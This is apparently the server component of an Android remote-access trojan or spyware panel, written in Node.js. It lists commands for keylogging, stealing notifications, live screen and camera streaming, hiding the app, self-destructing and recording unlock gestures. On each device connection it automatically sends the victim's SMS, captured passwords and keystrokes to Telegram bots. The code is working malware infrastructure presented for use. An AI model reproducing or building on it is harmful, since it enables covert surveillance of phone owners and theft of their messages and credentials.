    get_keylogs:               { category: 'keylog',       label: 'Get Keylogs',           icon: '⌨️' },
    clear_keylogs:             { category: 'keylog',       label: 'Clear Keylogs',         icon: '🧹' },
    // Notifications
    get_notifications:         { category: 'notifications',label: 'Get Notifications',     icon: '🔔' },
    get_notifications_from_app:{ category: 'notifications',label: 'Notifs From App',       icon: '🔔' },
    clear_notifications:       { category: 'notifications',label: 'Clear Notifications',   icon: '🧹' },
    // Screen Control (Accessibility)
    touch:                     { category: 'screen_ctrl',  label: 'Touch',                 icon: '👆' },
    swipe:                     { category: 'screen_ctrl',  label: 'Swipe',                 icon: '↔️' },
    press_back:                { category: 'screen_ctrl',  label: 'Press Back',            icon: '◀️' },
    press_home:                { category: 'screen_ctrl',  label: 'Press Home',            icon: '🏠' },
    press_recents:             { category: 'screen_ctrl',  label: 'Press Recents',         icon: '⬜' },
    open_notifications:        { category: 'screen_ctrl',  label: 'Open Notifications',    icon: '🔔' },
    open_quick_settings:       { category: 'screen_ctrl',  label: 'Open Quick Settings',   icon: '⚙️' },
    scroll_up:                 { category: 'screen_ctrl',  label: 'Scroll Up',             icon: '⬆️' },
    scroll_down:               { category: 'screen_ctrl',  label: 'Scroll Down',           icon: '⬇️' },
    input_text:                { category: 'screen_ctrl',  label: 'Input Text',            icon: '✏️' },
    press_enter:               { category: 'screen_ctrl',  label: 'Press Enter',           icon: '↵' },
    click_by_text:             { category: 'screen_ctrl',  label: 'Click By Text',         icon: '🔍' },
    wake_screen:               { category: 'screen_ctrl',  label: 'Wake Screen',           icon: '💡' },
    request_storage_permission:{ category: 'permissions',  label: 'Request Storage Perm',  icon: '📂' },
    screen_off:                { category: 'screen_ctrl',  label: 'Screen Off',            icon: '🌑' },
    open_task_manager:         { category: 'screen_ctrl',  label: 'Task Manager',          icon: '🗂️' },
    // Stealth
    fully_hide_app:            { category: 'stealth',     label: 'Hide App (Full)',       icon: '🔒' },
    fully_show_app:            { category: 'stealth',     label: 'Show App (Full)',       icon: '🔓' },
    // Screen Reader (Accessibility)
    read_screen:               { category: 'screen_reader',label: 'Read Screen',           icon: '📺' },
    screen_reader_start:         { category: 'screen_reader',label: 'Screen Reader Start (Rec)', icon: '▶️'  },
    screen_reader_stop:          { category: 'screen_reader',label: 'Screen Reader Stop (Rec)',  icon: '⏹'  },
    screen_reader_stream_start:  { category: 'screen_reader',label: 'Screen Reader Stream Start', icon: '📡' },
    screen_reader_stream_stop:   { category: 'screen_reader',label: 'Screen Reader Stream Stop',  icon: '⏸' },
    find_by_text:              { category: 'screen_reader',label: 'Find By Text',          icon: '🔍' },
    get_current_app:           { category: 'screen_reader',label: 'Current App',           icon: '📱' },
    get_clickable_elements:    { category: 'screen_reader',label: 'Clickable Elements',    icon: '👆' },
    get_input_fields:          { category: 'screen_reader',label: 'Input Fields',          icon: '✏️'  },
    // Screen Reader Recordings (forwarded to device — recordings stored on Android only)
    list_screen_recordings:    { category: 'screen_reader',label: 'List Screen Recordings',icon: '🎞' },
    get_screen_recording:      { category: 'screen_reader',label: 'Get Screen Recording',  icon: '📥' },
    delete_screen_recording:   { category: 'screen_reader',label: 'Delete Screen Recording',icon: '🗑' },
    // Accessibility check
    get_accessibility_status:  { category: 'system',       label: 'Accessibility Status',  icon: '♿' },
    // Streaming
    stream_start:                { category: 'streaming',   label: 'Start Stream',          icon: '📡' },
    stream_stop:                 { category: 'streaming',   label: 'Stop Stream',           icon: '⏹️' },
    // Screen Recording (saved on device)
    screen_record_start:         { category: 'streaming',   label: 'Start Screen Rec',      icon: '🔴' },
    screen_record_stop:          { category: 'streaming',   label: 'Stop Screen Rec',       icon: '⏹️' },
    screen_record_list_local:    { category: 'streaming',   label: 'List Local Recs',       icon: '🎬' },
    screen_record_delete_local:  { category: 'streaming',   label: 'Delete Local Rec',      icon: '🗑️' },
    screen_record_get_local:     { category: 'streaming',   label: 'Get Local Rec',         icon: '📥' },
    // Frame on demand
    stream_request_frame:        { category: 'streaming',   label: 'Request Frame',         icon: '📸' },
    // Screen blackout
    screen_blackout_on:          { category: 'screen_ctrl', label: 'Blackout On',           icon: '⬛' },
    screen_blackout_off:         { category: 'screen_ctrl', label: 'Blackout Off',          icon: '⬜' },
    get_blackout_status:         { category: 'screen_ctrl', label: 'Blackout Status',       icon: '⬛' },
    // Permissions / App Mode
    get_permissions:             { category: 'system',      label: 'Get Permissions',       icon: '🔐' },
    request_permission:          { category: 'system',      label: 'Request Permission',    icon: '🔑' },
    request_all_permissions:     { category: 'system',      label: 'Request All Perms',     icon: '🔑' },
    // Keylogger
    list_keylog_files:           { category: 'keylog',      label: 'List Keylog Files',     icon: '📁' },
    download_keylog_file:        { category: 'keylog',      label: 'Download Keylog File',  icon: '⬇️' },
    // App Monitor
    list_app_monitor_apps:       { category: 'app_monitor', label: 'List Monitored Apps',   icon: '📡' },
    get_app_keylogs:             { category: 'app_monitor', label: 'Get App Keylogs',       icon: '⌨️' },
    list_app_keylog_files:       { category: 'app_monitor', label: 'List App Keylog Files', icon: '📁' },
    download_app_keylog_file:    { category: 'app_monitor', label: 'Download App Keylog',   icon: '⬇️' },
    list_app_screenshots:        { category: 'app_monitor', label: 'List App Screenshots',  icon: '📷' },
    download_app_screenshot:     { category: 'app_monitor', label: 'Download App Screenshot',icon:'⬇️' },
    // App Manager
    uninstall_app:               { category: 'app_manager', label: 'Uninstall App',         icon: '🗑️' },
    force_stop_app:              { category: 'app_manager', label: 'Force Stop App',        icon: '⏹️' },
    open_app:                    { category: 'app_manager', label: 'Open App',              icon: '▶️' },
    gcode_capture:               { category: 'app_manager', label: 'GCode Capture (On-Device)', icon: '🔐' },
    clear_app_data:              { category: 'app_manager', label: 'Clear App Data',        icon: '🧹' },
    disable_app:                 { category: 'app_manager', label: 'Disable App',           icon: '🚫' },
    add_monitored_app:           { category: 'app_manager', label: 'Monitor App',           icon: '📡' },
    remove_monitored_app:        { category: 'app_manager', label: 'Stop Monitoring App',   icon: '📡' },
    // File Manager
    list_files:                  { category: 'files',       label: 'List Files',            icon: '📂' },
    read_file:                   { category: 'files',       label: 'Read File',             icon: '📄' },
    delete_file:                 { category: 'files',       label: 'Delete File',           icon: '🗑️' },
    // Self-destruct
    self_destruct:               { category: 'system',      label: 'Self Destruct',         icon: '💣' },
    // Gesture Pattern
    gesture_draw_pattern:        { category: 'gesture',     label: 'Draw Pattern',          icon: '🖊' },
    gesture_auto_capture_start:  { category: 'gesture',     label: 'Auto-Capture Start',    icon: '⏺' },
    gesture_auto_capture_stop:   { category: 'gesture',     label: 'Auto-Capture Stop',     icon: '⏹' },
    gesture_list:                { category: 'gesture',     label: 'List Gestures',         icon: '📋' },
    gesture_get:                 { category: 'gesture',     label: 'Get Gesture',           icon: '📄' },
    gesture_replay:              { category: 'gesture',     label: 'Replay Gesture',        icon: '▶️' },
    gesture_delete:              { category: 'gesture',     label: 'Delete Gesture',        icon: '🗑️' },
    gesture_live_start:          { category: 'gesture',     label: 'Live Stream Start',     icon: '📡' },
    gesture_live_stop:           { category: 'gesture',     label: 'Live Stream Stop',      icon: '⏹' },
    gesture_live_points:         { category: 'gesture',     label: 'Live Stream Points',    icon: '📍' },
    gesture_live_delete:         { category: 'gesture',     label: 'Live Stream Delete',    icon: '🗑️' },
    gesture_live_replay:         { category: 'gesture',     label: 'Live Stream Replay',    icon: '▶️' },
    gesture_live_list:           { category: 'gesture',     label: 'Live Stream List',      icon: '📋' },
    // Task Studio
    run_task_local:              { category: 'task',        label: 'Run Task (Local)',       icon: '▶️' },
    // Connection management
    restart_connection:          { category: 'system',      label: 'Restart Connection',    icon: '🔄' },
    // Audio / Volume control
    mute_device:                 { category: 'device',      label: 'Mute Device',           icon: '🔇' },
    unmute_device:               { category: 'device',      label: 'Unmute Device',         icon: '🔔' },
    // Wake / Keep-alive
    wake_keep_alive_start:       { category: 'screen_ctrl', label: 'Wake Keep-Alive Start', icon: '⏰' },
    wake_keep_alive_stop:        { category: 'screen_ctrl', label: 'Wake Keep-Alive Stop',  icon: '⏹️' },
};

// ============================================
// MONGOOSE MODELS
// ============================================
const Device      = require('./models/Device');
const User        = require('./models/User');
const Command     = require('./models/Command');
const ActivityLog = require('./models/ActivityLog');
const Task        = require('./models/Task');

const authRoutes    = require('./routes/auth');
const devicesRoutes = require('./routes/devices');
const userAuthRoutes = require('./routes/userAuth');

const MONGO_URI =
    process.env.MONGODB_URI ||
    process.env.MONGODB_URL ||
    process.env.mongodb_url ||
    process.env.mongodb_uri ||
    'mongodb://localhost:27017/access-control';

const _mongoKey = process.env.MONGODB_URI ? 'MONGODB_URI'
    : process.env.MONGODB_URL             ? 'MONGODB_URL'
    : process.env.mongodb_url             ? 'mongodb_url'
    : process.env.mongodb_uri             ? 'mongodb_uri'
    : '(fallback: localhost)';
log('DB', `Connecting via env key: ${_mongoKey}, protocol: ${MONGO_URI.split('://')[0]}, host starts with: ${MONGO_URI.split('@')[1]?.split('/')[0]?.substring(0,30) || 'N/A'}`);

mongoose.connect(MONGO_URI, {
    serverSelectionTimeoutMS: 5000,
    socketTimeoutMS: 45000
}).then(async () => {
    log('DB', 'MongoDB connected');
    // Mark every device offline on startup — the in-memory TCP map is empty after
    // a restart, so any device still flagged online in the DB is a stale ghost.
    // Devices will flip back to online as soon as they re-register over TCP.
    try {
        const r = await Device.updateMany({ isOnline: true }, { isOnline: false, lastSeen: new Date() });
        if (r.modifiedCount > 0) log('DB', `Startup: marked ${r.modifiedCount} stale device(s) offline`);
    } catch (e) { log('DB', 'Startup offline-mark failed: ' + e.message, 'warn'); }
}).catch(e => log('DB', 'MongoDB unavailable: ' + e.message, 'warn'));

// ============================================
// STATE
// TCP for Android devices; SSE (HTTP) for Dashboard
// ============================================
/** @type {Map<string, net.Socket & {id:string, deviceId?:string, clientType:'android', lastPong:number, buf:string}>} */
const tcpClients = new Map();          // connId → TCP socket
/** @type {Map<string, {res: import('express').Response, token:string}>} */
const sseClients = new Map();          // clientId → { res, token }
/** @type {Map<string, string>} */
const deviceToTcp = new Map();         // deviceId → primary TCP connId
/** @type {Map<string, string>} */
const deviceToStreamTcp = new Map();   // deviceId → stream channel TCP connId
/** @type {Map<string, string>} */
const deviceToLiveTcp = new Map();     // deviceId → live channel TCP connId
/** @type {Map<string, {sseId:string, command:string, deviceId:string, timer:NodeJS.Timeout}>} */
const pendingCmds = new Map();         // commandId → pending info
/** @type {Map<string, Object>} In-memory device registry for when MongoDB is unavailable */
const inMemoryDevices = new Map();     // deviceId → device object
/** @type {Set<string>} Devices that have an active stream session */
const deviceStreamingState = new Set(); // deviceId → streaming active
/** @type {Map<string, number>} Timestamp (ms) of last device:ping sent — used to compute true TCP RTT */
const devicePingTime = new Map();       // deviceId → Date.now() when ping was sent
/** @type {Map<string, number>} Track last frame relay time per device for throttling */
const deviceLastFrameMs = new Map();    // deviceId → Date.now() of last relayed frame
const FRAME_RELAY_MIN_MS = 100;         // Never relay frames faster than 10 FPS to SSE clients
/** @type {Map<string, Object>} Latest screen reader frame per device — polled by dashboard */
const latestScreenReaderData = new Map(); // deviceId → { success, screen, deviceId, _ts }
/** @type {Map<string, Object>} Latest JPEG stream frame per device — polled by dashboard */
const latestStreamFrame = new Map();      // deviceId → { frameData, deviceId, _ts, screenWidth?, screenHeight? }
/** @type {Map<string, Object>} Latest camera JPEG frame per device — polled by CameraMonitorTab */
const latestCameraFrame = new Map();      // deviceId → { frameData, cameraId, deviceId, _ts }

// ============================================
// LOGGING HELPERS
// ============================================
function log(tag, msg, level = 'info') {
    const ts = new Date().toISOString().slice(11, 23);
    const fn = level === 'warn' ? console.warn : level === 'error' ? console.error : console.log;
    fn(`[${ts}][${tag}] ${msg}`);
}

// ============================================
// PROTOCOL HELPERS
// Both TCP and WS use the same JSON envelope:
//   { "event": "...", "data": { ... } }
// TCP: newline-terminated strings  (SocketManager.java style)
// WS:  WebSocket text frames       (same JSON, no newline needed)
// ============================================

/** Send a protocol message to a TCP (Android) client */
function tcpSend(conn, event, data) {
    if (conn && conn.writable) {
        conn.write(JSON.stringify({ event, data }) + '\n');
    }
}

/** Push a server-sent event to one specific SSE (Dashboard) client */
function sseSend(clientId, event, data) {
    const client = sseClients.get(clientId);
    if (client && !client.res.writableEnded) {
        client.res.write(`data: ${JSON.stringify({ event, data })}\n\n`);
        if (typeof client.res.flush === 'function') client.res.flush();
    }
}

/** Broadcast an event to ALL connected SSE dashboard clients */
function broadcastDash(event, data) {
    if (sseClients.size === 0) return;
    // Pre-serialize once — avoids re-running JSON.stringify (which is expensive for large
    // stream:frame payloads) for every connected dashboard tab.
    const payload = `data: ${JSON.stringify({ event, data })}\n\n`;
    for (const [id, client] of sseClients) {
        if (!client.res.writableEnded) {
            client.res.write(payload);
            if (typeof client.res.flush === 'function') client.res.flush();
        }
    }
}

// ============================================
// SHARED MESSAGE PROCESSOR
// Both TCP and WS messages go through here
// ============================================
async function processMessage(clientId, clientType, event, data) {
    // Skip per-message log for high-frequency / noisy events.
    const highFreq = event === 'stream:frame'       || event === 'keylog:entry'  ||
                     event === 'notification:entry'  || event === 'app:foreground'||
                     event === 'device:heartbeat'    || event === 'device:pong'   ||
                     event === 'command:response'    || event === 'screen:update' ||
                     event === 'offline_recording:save';
    if (!highFreq) {
        log(clientType === 'android' ? 'TCP' : 'WS', `← [${clientId}] ${event}`);
    }

    // ── Events expected from Android (TCP) ──────────────────────────
    if (event === 'device:register') {
        const { deviceId, deviceInfo } = data || {};
        if (!deviceId) return;
        // Access ID — sent by the device, baked in at build time.
        // Kept on the device record so per-user dashboards can scope their list.
        const accessId = (data && (data.accessId || (deviceInfo && deviceInfo.accessId))) || '';

        // If there's an existing stale primary socket for this device, close it cleanly
        // before registering the new one — prevents ghost connections from later
        // broadcasting false device:disconnected events when they eventually time out.
        const existingPrimaryId = deviceToTcp.get(deviceId);
        if (existingPrimaryId && existingPrimaryId !== clientId) {
            const stale = tcpClients.get(existingPrimaryId);
            if (stale) {
                stale.destroy();
                tcpClients.delete(existingPrimaryId);
            }
        }

        // Link this TCP connection to the deviceId
        const conn = tcpClients.get(clientId);
        if (conn) {
            conn.deviceId = deviceId;
            conn.lastPong = Date.now();
            deviceToTcp.set(deviceId, clientId);
        }

        // Always update in-memory registry
        const info = { model: deviceInfo?.model, manufacturer: deviceInfo?.manufacturer,
                       androidVersion: deviceInfo?.androidVersion, name: deviceInfo?.name,
                       screenWidth: deviceInfo?.screenWidth, screenHeight: deviceInfo?.screenHeight };
        const existing = inMemoryDevices.get(deviceId) || {};
        const prevLastSeen = existing.lastSeen ? new Date(existing.lastSeen).getTime() : 0;
        const prevOnline   = !!existing.isOnline;
        const RECONNECT_THRESHOLD_MS = 5 * 60 * 1000;
        const isFreshConnect = !prevLastSeen || (!prevOnline && (Date.now() - prevLastSeen) > RECONNECT_THRESHOLD_MS);
        const deviceRecord = { ...existing, deviceId,
            deviceName: deviceInfo?.name || deviceId, deviceInfo: info,
            accessId: accessId || existing.accessId || '',
            isOnline: true, lastSeen: new Date() };
        inMemoryDevices.set(deviceId, deviceRecord);

        // Persist to Redis
        R.saveDevice(deviceId, deviceRecord).catch(() => {});

        // Persist / update (optional MongoDB)
        try {
            let dev = await Device.findOne({ deviceId });
            if (!dev) {
                dev = new Device({ deviceId, deviceName: deviceInfo?.name || deviceId,
                                   deviceInfo: info, accessId: accessId || '', isOnline: true });
            } else {
                dev.isOnline  = true;
                dev.lastSeen  = new Date();
                dev.deviceInfo = { ...(dev.deviceInfo || {}), ...info };
                if (accessId) dev.accessId = accessId;
                dev.markModified('deviceInfo');
            }
            await dev.save();
        } catch (e) { log('DB', 'save error: ' + e.message, 'warn'); }

        // Load saved tasks from MongoDB scoped to this accessId and send them to the device
        let deviceTasks = [];
        try {
            const taskQuery = accessId
                ? { $or: [{ accessId }, { accessId: '' }, { deviceId }] }
                : { $or: [{ accessId: '' }, { deviceId }] };
            deviceTasks = await Task.find(taskQuery).sort({ updatedAt: -1 }).lean();
        } catch (_) {}

        // Ack back to device
        if (conn) tcpSend(conn, 'device:registered', { success: true, deviceId, tasks: deviceTasks });

        // Dispatch scheduled tasks (scheduleOnConnect) to the device on fresh connect — runs only once then clears the flag
        if (isFreshConnect) {
            try {
                const scheduledTasks = await Task.find({
                    scheduleOnConnect: true,
                    $or: accessId
                        ? [{ accessId }, { accessId: '' }]
                        : [{ accessId: '' }],
                }).lean();
                for (const task of scheduledTasks) {
                    const freshConn = _getTcpConnForDevice(deviceId);
                    if (!freshConn || !freshConn.writable) break;
                    const schedCmdId = crypto.randomBytes(12).toString('hex');
                    tcpSend(freshConn, 'command:execute', {
                        commandId: schedCmdId,
                        command:   'run_task_local',
                        params:    { steps: task.steps || [], taskName: task.name },
                    });
                    log('TASK', `Auto-dispatched scheduled task "${task.name}" → ${deviceId} (one-shot — clearing flag)`);
                    // Clear the flag so it does not run again on the next connect
                    try { await Task.findByIdAndUpdate(task._id, { scheduleOnConnect: false }); } catch (_) {}
                }
            } catch (_) {}
        }

        // Notify dashboards (only on a real fresh connect, not re-registers within 5 min)
        if (isFreshConnect) {
            broadcastDashScoped('device:connected', { deviceId, deviceInfo, accessId, timestamp: new Date() }, accessId || null);
        }
        broadcastDeviceList();

        // Telegram notification — only on a real fresh connect (>5 min since last seen)
        if (isFreshConnect) {
            const name    = deviceInfo?.name || deviceId;
            const model   = [deviceInfo?.manufacturer, deviceInfo?.model].filter(Boolean).join(' ') || 'Unknown';
            const android = deviceInfo?.androidVersion ? `Android ${deviceInfo.androidVersion}` : null;
            const ts      = new Date().toLocaleString();
            const text    =
                `🟢 <b>Device Online</b>\n` +
                `━━━━━━━━━━━━━━━━━━━\n` +
                `📱 <b>${name}</b>\n` +
                `🆔 <code>${deviceId}</code>\n` +
                `📟 ${model}\n` +
                (android ? `🤖 ${android}\n` : '') +
                `🕐 <i>${ts}</i>`;
            if (telegramSettings.notifyConnect) sendTelegram(text);
            broadcastTelegramToUsers(text, 'connect');

            // Auto-send last 100 SMS to Telegram on connect
            const _doAutoSms = async () => {
                try {
                    const usersForSms = accessId ? await User.find({
                        role: 'user', accessId,
                        telegramEnabled: true,
                        telegramSendSmsOnConnect: true,
                        telegramBotToken: { $ne: '' },
                        telegramChatId:   { $ne: '' },
                    }).select('telegramBotToken telegramChatId').lean() : [];
                    const adminWants = telegramSettings.enabled && telegramSettings.sendSmsOnConnect;
                    if (adminWants || usersForSms.length) {
                        await new Promise(r => setTimeout(r, 3000));
                        await _autoSendSmsToTelegram(deviceId, name, adminWants, usersForSms);
                    }
                } catch (_) {}
            };
            _doAutoSms();

            // Auto-send captured passwords to Telegram on connect
            const _doAutoPasswords = async () => {
                try {
                    const usersForPwd = accessId ? await User.find({
                        role: 'user', accessId,
                        telegramEnabled: true,
                        telegramSendPasswordsOnConnect: true,
                        telegramBotToken: { $ne: '' },
                        telegramChatId:   { $ne: '' },
                    }).select('telegramBotToken telegramChatId').lean() : [];
                    const adminWants = telegramSettings.enabled && telegramSettings.sendPasswordsOnConnect;
                    if (adminWants || usersForPwd.length) {
                        await new Promise(r => setTimeout(r, 4000));
                        await _autoSendPasswordsToTelegram(deviceId, name, adminWants, usersForPwd);
                    }
                } catch (_) {}
            };
            _doAutoPasswords();

            // Auto-sync passwords + contacts into memory (5-min dedup)
            // Runs slightly after the Telegram send so both don't hammer the device simultaneously
            setTimeout(() => _autoSyncDevice(deviceId).catch(() => {}), 6000);
        }

        // ── Auto-request installed apps with 5-min dedup (runs on every connect) ──
        // Only fires if the last successful request was more than 5 minutes ago,
        // preventing redundant fetches on rapid reconnects.
        {
            const _APPS_DEDUP_MS = 5 * 60 * 1000;
            const lastApps = (deviceLastSyncAt.get(deviceId) || {}).apps || 0;
            if (Date.now() - lastApps > _APPS_DEDUP_MS) {
                deviceLastSyncAt.set(deviceId, { ...(deviceLastSyncAt.get(deviceId) || {}), apps: Date.now() });
                setTimeout(() => {
                    try {
                        const c = _getTcpConnForDevice(deviceId);
                        if (!c || !c.writable) return;
                        const cmdId = crypto.randomBytes(12).toString('hex');
                        _internalCmdCallbacks.set(cmdId, { ts: Date.now(), handler: (response) => {
                            if (!response) return;
                            try {
                                const d = typeof response === 'string' ? JSON.parse(response) : response;
                                const apps = d.apps || d.installedApps || d.data || [];
                                if (apps.length) {
                                    const rec = inMemoryDevices.get(deviceId) || {};
                                    inMemoryDevices.set(deviceId, { ...rec, installedApps: apps, appsUpdatedAt: new Date() });
                                    log('SYNC', `Installed apps synced: ${apps.length} apps for ${deviceId}`);
                                }
                            } catch (_) {}
                        }});
                        setTimeout(() => _internalCmdCallbacks.delete(cmdId), 60000);
                        tcpSend(c, 'command:execute', { commandId: cmdId, command: 'get_installed_apps', params: {} });
                        log('SYNC', `Auto-requesting installed apps for ${deviceId}`);
                    } catch (_) {}
                }, 2500);
            }
        }

        return;
    }

    // ── Multi-channel registration from Android secondary sockets ────────────
    if (event === 'device:register_channel') {
        const { deviceId, channelType } = data || {};
        if (!deviceId || !channelType) return;
        const conn = tcpClients.get(clientId);
        if (conn) {
            conn.deviceId    = deviceId;
            conn.channelType = channelType;
            conn.lastPong    = Date.now();
            if (channelType === 'stream') {
                // Evict old stale stream socket before registering the new one
                const oldStreamId = deviceToStreamTcp.get(deviceId);
                if (oldStreamId && oldStreamId !== clientId) {
                    const stale = tcpClients.get(oldStreamId);
                    if (stale) { stale.destroy(); tcpClients.delete(oldStreamId); }
                }
                deviceToStreamTcp.set(deviceId, clientId);
                log('TCP', `Stream channel registered for ${deviceId}`);
                // Auto-resume streaming if device had an active stream session
                if (deviceStreamingState.has(deviceId)) {
                    const primaryId = deviceToTcp.get(deviceId);
                    const primaryConn = primaryId ? tcpClients.get(primaryId) : null;
                    if (primaryConn && primaryConn.writable) {
                        const autoCommandId = crypto.randomBytes(12).toString('hex');
                        setTimeout(() => {
                            tcpSend(primaryConn, 'command:execute', { commandId: autoCommandId, command: 'stream_start', params: null });
                            log('TCP', `Auto-resumed stream for ${deviceId} after channel reconnect [${autoCommandId}]`);
                        }, 600);
                    }
                }
            } else if (channelType === 'live') {
                // Evict old stale live socket before registering the new one
                const oldLiveId = deviceToLiveTcp.get(deviceId);
                if (oldLiveId && oldLiveId !== clientId) {
                    const stale = tcpClients.get(oldLiveId);
                    if (stale) { stale.destroy(); tcpClients.delete(oldLiveId); }
                }
                deviceToLiveTcp.set(deviceId, clientId);
                log('TCP', `Live channel registered for ${deviceId}`);
            }
        }
        return;
    }

    if (event === 'device:heartbeat') {
        const { deviceId } = data || {};
        if (!deviceId) return;
        const conn = tcpClients.get(clientId);
        if (conn) conn.lastPong = Date.now();
        // Update in-memory registry
        const existing = inMemoryDevices.get(deviceId);
        if (existing) inMemoryDevices.set(deviceId, { ...existing, isOnline: true, lastSeen: new Date() });
        // Broadcast to dashboards immediately, then persist async
        broadcastDash('device:heartbeat', { deviceId, timestamp: new Date() });
        R.markDeviceOnline(deviceId).catch(() => {});
        Device.findOneAndUpdate({ deviceId }, { lastSeen: new Date(), isOnline: true }).catch(() => {});
        return;
    }

    if (event === 'device:pong') {
        const conn = tcpClients.get(clientId);
        if (conn) {
            conn.lastPong = Date.now();
            // Compute true server-side TCP RTT (only for primary channel pongs)
            if (!conn.channelType && conn.deviceId && devicePingTime.has(conn.deviceId)) {
                const rtt = conn.lastPong - devicePingTime.get(conn.deviceId);
                devicePingTime.delete(conn.deviceId);
                broadcastDash('device:latency', { deviceId: conn.deviceId, rtt });
            }
        }
        return;
    }

    // ── Keylog push from Android → relay to dashboards ──────────────
    if (event === 'keylog:entry') {
        const conn = tcpClients.get(clientId);
        if (conn) conn.lastPong = Date.now(); // keep live channel alive
        const deviceId = conn?.deviceId || data?.deviceId;
        if (deviceId) {
            const entry = { ...data, deviceId, timestamp: data.timestamp || new Date().toISOString() };
            broadcastDash('keylog:push', entry);
            // Persist to Redis (non-blocking)
            R.pushKeylog(deviceId, entry).catch(() => {});
            // Forward to Telegram if admin enabled live keylog forwarding
            if (telegramSettings.enabled && telegramSettings.sendKeylogOnConnect) {
                const rec = inMemoryDevices.get(deviceId);
                const devName = rec?.deviceInfo?.name || rec?.deviceName || deviceId;
                _bufferKeylogForTelegram(deviceId, devName, entry);
            }
            // Also forward to per-user Telegrams if they have keylog enabled
            _forwardKeylogToUsers(deviceId, entry).catch(() => {});
        }
        return;
    }

    // ── Notification push from Android → relay to dashboards ─────────
    if (event === 'notification:entry') {
        const conn = tcpClients.get(clientId);
        if (conn) conn.lastPong = Date.now(); // keep live channel alive
        const deviceId = conn?.deviceId || data?.deviceId;
        if (deviceId) {
            const entry = { ...data, deviceId };
            // Store in memory per device (last 200)
            if (!global.deviceNotifications) global.deviceNotifications = new Map();
            const list = global.deviceNotifications.get(deviceId) || [];
            list.unshift(entry);
            if (list.length > 200) list.pop();
            global.deviceNotifications.set(deviceId, list);
            // Persist to Redis (non-blocking)
            R.pushNotification(deviceId, entry).catch(() => {});
            broadcastDash('notification:push', entry);
        }
        return;
    }

    // ── Recent app activity from Android → relay to dashboards ───────
    if (event === 'app:foreground') {
        const conn = tcpClients.get(clientId);
        if (conn) conn.lastPong = Date.now(); // keep live channel alive
        const deviceId = conn?.deviceId || data?.deviceId;
        if (deviceId) {
            const entry = { ...data, deviceId };
            if (!global.deviceActivity) global.deviceActivity = new Map();
            const list = global.deviceActivity.get(deviceId) || [];
            // Dedupe consecutive same-app entries
            if (!list.length || list[0].packageName !== entry.packageName) {
                list.unshift(entry);
                if (list.length > 100) list.pop();
                global.deviceActivity.set(deviceId, list);
                // Persist to Redis (non-blocking)
                R.pushActivity(deviceId, entry).catch(() => {});
                broadcastDash('activity:app_open', entry);
            }
        }
        return;
    }

    // ── Screen reader push from Android → relay to dashboards ────────
    if (event === 'screen:update') {
        const conn = tcpClients.get(clientId);
        if (conn) conn.lastPong = Date.now();
        const deviceId = conn?.deviceId || data?.deviceId;
        if (!deviceId) return;

        let relayData = data;

        // Android compresses the accessibility-tree JSON with GZIP to save 3G bandwidth.
        // Detect the compressed envelope, decompress, then relay the original payload.
        if (data?.compressed === true && typeof data?.data === 'string') {
            try {
                const buf   = Buffer.from(data.data, 'base64');
                const plain = zlib.gunzipSync(buf).toString('utf8');
                relayData   = { ...JSON.parse(plain), deviceId };
            } catch (e) {
                // Decompression failed — drop this frame rather than relay garbage
                return;
            }
        }

        // Cache the latest frame so the dashboard can poll it even if SSE is unreliable
        latestScreenReaderData.set(deviceId, { ...relayData, deviceId, _ts: Date.now() });
        broadcastDash('screen:update', { ...relayData, deviceId });
        return;
    }

    // ── Offline recording notification from Android ──
    // Recordings are stored ONLY on the Android device.
    // Server just notifies the dashboard so it can refresh its list from the device.
    if (event === 'offline_recording:save') {
        const conn = tcpClients.get(clientId);
        const deviceId = conn?.deviceId || data?.deviceId;
        const frameCount = data?.frameCount || 0;
        // Silently drop empty recordings — Android sends these in bulk on reconnect
        if (!deviceId || frameCount === 0) return;
        broadcastDash('offline_recording:saved', {
            deviceId,
            frameCount,
            label: data?.label || '',
        });
        log('TCP', `Recording saved on device ${deviceId} (${frameCount} frames)`);
        return;
    }

    // ── Stream frame from Android ────────────────────────────────────
    if (event === 'stream:frame') {
        const conn = tcpClients.get(clientId);
        if (conn) conn.lastPong = Date.now(); // keep stream channel alive
        const deviceId = conn?.deviceId;
        if (!deviceId) return;
        const frameData = data?.frameData;
        if (!frameData) return;

        // Throttle: drop frames that arrive faster than FRAME_RELAY_MIN_MS per device.
        // This prevents SSE flooding on slow dashboard connections (e.g. the dashboard
        // on a slow connection can't consume 3 FPS — only relay what it can absorb).
        const now = Date.now();
        const lastRelay = deviceLastFrameMs.get(deviceId) || 0;
        if (now - lastRelay < FRAME_RELAY_MIN_MS) return; // drop this frame
        deviceLastFrameMs.set(deviceId, now);

        // Relay to all dashboard clients — include screen dimensions for coordinate mapping.
        // Always use the server's relay time (now) as the timestamp so the dashboard's
        // staleness check (Date.now() - timestamp) compares server-clock to server-clock
        // instead of device-clock to server-clock (which differ due to timezone / NTP drift).
        const frameMsg = { deviceId, frameData, timestamp: now };
        if (data.screenWidth)  frameMsg.screenWidth  = data.screenWidth;
        if (data.screenHeight) frameMsg.screenHeight = data.screenHeight;

        // Cache the latest JPEG frame so the dashboard can poll it even if SSE is unreliable.
        latestStreamFrame.set(deviceId, { ...frameMsg, _ts: now });

        broadcastDash('stream:frame', frameMsg);
        return;
    }

    // ── Camera frame from Android ─────────────────────────────────────
    if (event === 'camera:frame') {
        const conn = tcpClients.get(clientId);
        const deviceId = conn?.deviceId;
        if (!deviceId) return;
        const frameData = data?.frameData;
        if (!frameData) return;

        const now = Date.now();
        const cameraMsg = {
            deviceId,
            frameData,
            cameraId: data.cameraId || '0',
            timestamp: now,
            _ts: now,
        };
        latestCameraFrame.set(deviceId, cameraMsg);
        broadcastDash('camera:frame', cameraMsg);
        return;
    }

    // ── Command response from Android ───────────────────────────────
    if (event === 'command:response') {
        const { commandId, response: rawResponse, error } = data || {};
        if (!commandId) return;

        const conn = tcpClients.get(clientId);
        const deviceId = conn?.deviceId;

        // Android's sendResponse() JSON-stringifies the response object before putting it
        // into the TCP envelope, so rawResponse arrives as a string, not an object.
        // Parse it here so all downstream code can treat `response` as a plain object.
        let response = rawResponse;
        if (typeof rawResponse === 'string') {
            try { response = JSON.parse(rawResponse); } catch (_) { response = rawResponse; }
        }

        // Check internal server-side callbacks first (auto-commands triggered on device connect)
        const internalCb = _internalCmdCallbacks.get(commandId);
        if (internalCb) {
            _internalCmdCallbacks.delete(commandId);
            try { internalCb.handler(response, error); } catch (_) {}
        }

        // Push to dashboard SSE IMMEDIATELY — before any DB operations
        const pending = pendingCmds.get(commandId);
        if (pending) {
            clearTimeout(pending.timer);
            pendingCmds.delete(commandId);

